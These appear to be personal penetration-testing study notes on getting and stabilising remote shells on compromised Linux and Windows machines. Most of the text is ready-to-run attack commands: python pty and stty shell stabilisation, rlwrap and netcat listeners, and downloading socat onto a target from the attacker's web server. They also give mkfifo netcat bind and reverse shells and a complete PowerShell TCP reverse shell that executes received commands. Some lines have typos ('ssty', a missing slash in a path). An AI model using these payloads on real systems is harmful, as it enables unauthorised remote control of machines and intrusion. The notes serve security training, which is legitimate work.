


1. `python -c 'import pty;pty.spawn("/bin/bash")'`
2. `export TERM=xterm`
3. Background the shell using Ctrl + Z. Back in our own terminal we use `stty raw -echo; fg`


## option A
After receiving reversed shell you can stabalize the shell if python is installed


Mind you, you may need to specify the python version

#### 3 steps
Launch bash shell:
`python -c 'import pty;pty.spawn("bin/bash")'`

backout the shell with ctr-z, setup xterm commands: 
`export TERM=xterm`

output the shell to echo raw, and bring it back to the foreground:
`stty raw -echo; fg `

Note: If the shell dies your input/output on that shell won't work anymore, type `reset` and press `[enter]`.


## Option B
### rlwrap

Specialy usefull for windows machines

`sudo apt install rlwrap`

`rlwrap nc -lnvp <port>`

Also this shell can be completely stabalized by disabling the output
`ssty raw -echo; fg`

### Option C 
Socat, 

This technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. 

To accomplish this method of stabilisation we would first transfer a socat static compiled binary (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary 
`sudo python3 -m http.server 80`, then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget 
`wget <LOCAL-IP>/socat -O /tmp/socat`.

For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`. We will cover the syntax for sending and receiving shells with Socat in the upcoming tasks. 




### NC BIND SHELL
``mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f``


_The command first creates a [named pipe](https://www.linuxjournal.com/article/2156) at `/tmp/f`. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into `sh`, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle._


### NC REVERSE SHELL 

`mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
This command is virtually identical to the previous one, other than using the netcat connect syntax, as opposed to the netcat listen syntax.

### WINDOWS Powershell reverse shell

`powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

